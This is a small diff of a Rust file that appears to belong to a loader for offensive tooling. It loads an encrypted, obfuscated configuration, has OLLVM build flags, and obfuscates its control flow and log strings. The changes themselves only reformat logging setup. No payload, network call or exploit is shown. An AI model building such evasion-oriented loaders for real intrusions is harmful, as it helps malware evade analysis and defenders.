@@ -12,7 +12,6 @@ extern crate env_logger;
 use log::error;
 use log::info;
 
-
 // ------ STANDARD compilation
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
@@ -35,19 +34,20 @@ const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/in
 #[cfg(feature="ollvm")]
 const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated.dataop");
 
-
-
-
 pub fn run_loader() {
     #[cfg(feature = "info")]
-    #[cfg(not(feature="debug"))]
-    env_logger::builder().filter_level(log::LevelFilter::Info).init();
+    #[cfg(not(feature = "debug"))]
+    env_logger::builder()
+        .filter_level(log::LevelFilter::Info)
+        .init();
 
     #[cfg(feature = "debug")]
-    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
+    env_logger::builder()
+        .filter_level(log::LevelFilter::Debug)
+        .init();
 
     cryptify::flow_stmt!();
-    
+
     let session_id: String = uuid::Uuid::new_v4().to_string();
     info!("{}{}", encrypt_string!("[+] session_id "), session_id);
     info!("");
